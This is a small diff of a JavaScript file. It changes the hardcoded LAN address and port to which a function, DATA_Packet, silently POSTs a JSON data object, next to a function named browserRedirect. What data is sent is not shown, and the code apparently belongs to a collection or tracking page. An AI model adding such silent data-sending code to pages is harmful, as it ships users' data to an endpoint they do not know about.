@@ -89,7 +89,7 @@ function browserRedirect(){
 
 function DATA_Packet(DATA){
     var xhr = new XMLHttpRequest();
-    xhr.open("POST","http://192.168.8.103:8888",true);//Tag
+    xhr.open("POST","http://192.168.31.1:1234",true);//Tag
     xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=utf-8');
     xhr.send(JSON.stringify(DATA));
 }
